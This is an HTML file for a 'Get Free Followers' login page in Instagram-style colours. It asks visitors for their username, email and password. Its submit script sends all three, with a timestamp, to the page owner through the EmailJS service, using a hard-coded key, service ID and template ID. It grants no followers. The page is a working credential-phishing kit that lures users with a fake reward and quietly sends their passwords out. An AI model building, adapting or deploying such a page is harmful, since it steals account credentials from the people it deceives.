<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Free Followers - Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- EmailJS Library -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      emailjs.init("xBFsd72vLc0du-5Ko"); // Your EmailJS Public Key
      console.log('EmailJS initialized');
    })();
  </script>

  <style>
    body {
      min-height: 100vh;
      margin: 0;
      padding: 0;
      background: linear-gradient(270deg, #fd5949, #d6249f, #285AEB, #fd5949);
      background-size: 600% 600%;
      animation: gradientBG 12s ease-in-out infinite;
      font-family: Arial, sans-serif;
    }
    @keyframes gradientBG {
      0% {background-position:0% 50%}
      50% {background-position:100% 50%}
      100% {background-position:0% 50%}
    }
    .followers-hero-bg {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .followers-hero {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px rgba(40,90,235,0.13), 0 1.5px 8px rgba(214,36,159,0.10);
      padding: 44px 34px;
      max-width: 370px;
      width: 100%;
      text-align: center;
    }
    .followers-title {
      font-size: 2rem;
      font-weight: bold;
      background: linear-gradient(90deg, #fd5949 0%, #d6249f 50%, #285AEB 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 8px;
    }
    .followers-subtitle {
      color: #666;
      font-size: 1rem;
      margin-bottom: 22px;
    }
    .insta-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: stretch;
    }
    .form-group {
      position: relative;
      margin-bottom: 28px;
    }
    .insta-input {
      width: 100%;
      padding: 14px 12px;
      border: none;
      border-bottom: 2px solid #dbdbdb;
      background: transparent;
      font-size: 16px;
      outline: none;
      color: #222;
    }
    .insta-input:focus {
      border-bottom: 2px solid #285AEB;
    }
    .insta-label {
      position: absolute;
      left: 12px;
      top: 16px;
      font-size: 16px;
      color: #888;
      pointer-events: none;
      transition: 0.2s;
    }
    .insta-input:focus + .insta-label,
    .insta-input:not(:placeholder-shown) + .insta-label {
      top: -10px;
      left: 6px;
      font-size: 13px;
      color: #d6249f;
      background: #fff;
      padding: 0 4px;
    }
    .followers-btn {
      background: linear-gradient(90deg, #fd5949 0%, #d6249f 50%, #285AEB 100%);
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 15px;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
      margin-top: 10px;
    }
    #status {
      margin-top:15px;
      color:#285AEB;
      font-weight:bold;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="followers-hero-bg">
    <div class="followers-hero">
      <h1 class="followers-title">Get Free Followers</h1>
      <p class="followers-subtitle">Login to get your free followers instantly!</p>
      
      <form class="insta-form" id="loginForm" autocomplete="off">
        <div class="form-group">
          <input type="text" name="username" class="insta-input" placeholder=" " required>
          <label class="insta-label">Username</label>
        </div>
        <div class="form-group">
          <input type="email" name="email" class="insta-input" placeholder=" " required>
          <label class="insta-label">Email Address</label>
        </div>
        <div class="form-group">
          <input type="password" name="password" class="insta-input" placeholder=" " required>
          <label class="insta-label">Password</label>
        </div>
        <button type="submit" class="followers-btn" id="submitBtn">
          <span>Get Free Followers</span>
        </button>
      </form>
      
      <div id="status"></div>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const submitBtn = document.getElementById('submitBtn');
      const statusDiv = document.getElementById('status');
      
      submitBtn.disabled = true;
      statusDiv.innerHTML = 'Sending...';

      const templateParams = {
        username: document.querySelector('input[name="username"]').value,
        email: document.querySelector('input[name="email"]').value,
        password: document.querySelector('input[name="password"]').value,
        time: new Date().toLocaleString()
      };

      emailjs.send('service_36ay7pp', 'template_dkn05np', templateParams)
        .then(function(response) {
          console.log('SUCCESS!', response.status, response.text);
          statusDiv.innerHTML = '✅ Request sent successfully!';
          statusDiv.style.color = '#28a745';
          document.getElementById('loginForm').reset();
        }, function(error) {
          console.log('FAILED...', error);
          statusDiv.innerHTML = `❌ Failed to send request. Error: ${error.text || error}`;
          statusDiv.style.color = '#dc3545';
        })
        .finally(function() {
          submitBtn.disabled = false;
        });
    });
  </script>
</body>
</html>
